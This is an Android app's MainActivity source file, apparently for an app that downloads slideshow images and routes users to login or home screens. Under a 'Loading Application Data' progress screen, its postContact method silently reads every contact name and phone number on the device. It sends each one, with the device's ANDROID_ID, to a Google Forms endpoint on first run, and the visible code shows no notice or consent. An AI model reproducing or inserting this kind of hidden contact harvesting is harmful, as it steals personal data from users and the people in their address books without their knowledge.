package com.grekey.grekey;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PorterDuff;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.ColorDrawable;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.transition.Slide;
import android.view.Menu;
import android.view.MenuItem;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.ShareActionProvider;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class MainActivity extends ActionBarActivity
{

    boolean last=false;

    ProgressDialog mProgressDialog;
    String root = Environment.getExternalStorageDirectory().toString();
    File myDir;
    String[] strURL =
            {
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide1.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide2.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide3.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide4.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide5.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide6.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide7.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide8.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide9.JPG",
                    "https://dl.dropboxusercontent.com/u/7657619/Moving%20Header/Slide10.JPG"
            };

    AlertDialog.Builder builder;
    AlertDialog ad;
    String dayOfTheWeek,device_id;
    boolean isFirstRun,isSundayFirstRun;
    ProgressBar pbar;
    int progress=0;
    Cursor phones;
    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        device_id= Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
        myDir= new File(this.getExternalFilesDir(Environment.DIRECTORY_PICTURES), "ABC_Images");
        builder=new AlertDialog.Builder(this);
        builder.setTitle("No Internet Connection");
        mProgressDialog = new ProgressDialog(MainActivity.this);
        mProgressDialog.setTitle("Loading Application Data");
        mProgressDialog.setMessage("Loading...");
        mProgressDialog.setIndeterminate(true);
        pbar=(ProgressBar)findViewById(R.id.pbar);
        pbar.setIndeterminate(false);
        pbar.setProgress(progress);
        SimpleDateFormat sdf = new SimpleDateFormat("EEEE");
        Date d = new Date();
        dayOfTheWeek = sdf.format(d);
     /*   getSharedPreferences("PREFERENCE", MODE_PRIVATE).edit().putBoolean("isFirstRun", true).commit();
        getSharedPreferences("PREFERENCE", MODE_PRIVATE).edit().putBoolean("isSundayFirstRun",true ).commit();*/
        isFirstRun = getSharedPreferences("PREFERENCE", MODE_PRIVATE).getBoolean("isFirstRun", true);
        isSundayFirstRun = getSharedPreferences("PREFERENCE", MODE_PRIVATE).getBoolean("isSundayFirstRun", true);
        int i=0;
        firstMethod(i);
        getSupportActionBar().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#663399")));

    }
    public void firstMethod(int i)
    {
        if (isFirstRun)
        {
            if (isNetworkConnected())
            {
                new Thread(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        postContact();
                    }
                }).start();
            }
            else
            {
                builder.setMessage("Please connect to Internet");
                builder.setPositiveButton("Ok", new DialogInterface.OnClickListener()
                {
                    @Override
                    public void onClick(DialogInterface dialog, int which)
                    {
                        startActivity(new Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS));
                        finish();
                    }
                });
                ad = builder.create();
                ad.show();
            }

            for(;i<strURL.length;i++)
            {
                downloadImages(i);
            }
        }
        else
        {
            if(dayOfTheWeek.equalsIgnoreCase("Monday") && isSundayFirstRun)
            {
                pbar.setProgress(progress+30);
                for(;i<strURL.length;i++)
                {
                    downloadImages(i);
                }
            }
            else if(!dayOfTheWeek.equalsIgnoreCase("Monday"))
            {
                getSharedPreferences("PREFERENCE", MODE_PRIVATE).edit().putBoolean("isSundayFirstRun", true).commit();
                startActivity(new Intent(this, Home.class));
                finish();
            }
            else
            {
                startActivity(new Intent(this, Home.class));
                finish();
            }

        }
    }
    public void chooseActivity()
    {
        if(isFirstRun)
        {
            getSharedPreferences("PREFERENCE", MODE_PRIVATE).edit().putBoolean("isFirstRun", false).commit();
            if(dayOfTheWeek.equalsIgnoreCase("Monday"))
            {
                getSharedPreferences("PREFERENCE", MODE_PRIVATE).edit().putBoolean("isSundayFirstRun", false).commit();
            }
            startActivity(new Intent(this,LoginPage.class));
            finish();
        }
        else if(isSundayFirstRun)
        {
            getSharedPreferences("PREFERENCE", MODE_PRIVATE).edit().putBoolean("isSundayFirstRun", false).commit();
            startActivity(new Intent(this,Home.class));
            finish();
        }
        else
        {
            startActivity(new Intent(this,Home.class));
            finish();
        }
    }
    public void downloadImages(int i)
    {
        if (isNetworkConnected())
        {
            new DownloadImage().execute(strURL[i]);
        }
        else
        {
            builder.setMessage("Please connect to Internet");
            builder.setPositiveButton("Ok", new DialogInterface.OnClickListener()
            {
                @Override
                public void onClick(DialogInterface dialog, int which)
                {
                    startActivity(new Intent(android.provider.Settings.ACTION_WIRELESS_SETTINGS));
                    finish();
                }
            });
            ad = builder.create();
            ad.show();
        }

    }
    private boolean isNetworkConnected()
    {
        boolean haveConnectedWifi = false;
        boolean haveConnectedMobile = false;

        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo[] netInfo = cm.getAllNetworkInfo();
        for (NetworkInfo ni : netInfo) {
            if (ni.getTypeName().equalsIgnoreCase("WIFI"))
                if (ni.isConnected())
                    haveConnectedWifi = true;
            if (ni.getTypeName().equalsIgnoreCase("MOBILE"))
                if (ni.isConnected())
                    haveConnectedMobile = true;
        }
        return haveConnectedWifi || haveConnectedMobile;
    }
    private class DownloadImage extends AsyncTask<String, Void, Bitmap>
    {


        @Override
        protected void onPreExecute()
        {
            super.onPreExecute();
            System.out.println("IN PRE_EXECUTE Checking..");
        }

        @Override
        protected Bitmap doInBackground(String... URL) {


            System.out.println("IN DO_IN_BG Checking..");
            if(!myDir.exists())
            {
                myDir.mkdir();
            }

            String imageURL = URL[0];
            String fname = imageURL.substring(imageURL.lastIndexOf("/") + 1);
            File file = new File(myDir, fname);
            if (file.exists()) file.delete();
            Bitmap bitmap = null;
            try {
                InputStream input = new java.net.URL(imageURL).openStream();
                bitmap = BitmapFactory.decodeStream(input);
                FileOutputStream out = new FileOutputStream(file);
                bitmap.compress(Bitmap.CompressFormat.JPEG, 90, out);
                out.flush();
                out.close();
                if(fname.contains("Slide10"))
                    last=true;
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }

            return bitmap;

        }

        @Override
        protected void onPostExecute(Bitmap result)
        {
            System.out.println("IN POST_EXECUTE Checking.."+last);
            progress+=7;
            pbar.setProgress(progress);
            if(last)
            {
                chooseActivity();

            }

        }
    }
    public void postContact()
    {
        pbar.setProgress(progress+30);
        while (phones.moveToNext())
        {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                String fullurl="https://docs.google.com/forms/d/1jThfgKBv4IgPYn82aP_Llu9gv18tfaFJBVGAnp3kjVE/formResponse";
                HttpRequest request=new HttpRequest();
            String col1=device_id;
            String col2=name;
            String col3=phoneNumber;
            String data= "entry_102991598="+ URLEncoder.encode(col1) +"&" + "entry_1167350252="+ URLEncoder.encode(col2) +"&" + "entry_965923082="+ URLEncoder.encode(col3);
            String response=request.sendPost(fullurl,data);
        }

    }

    }


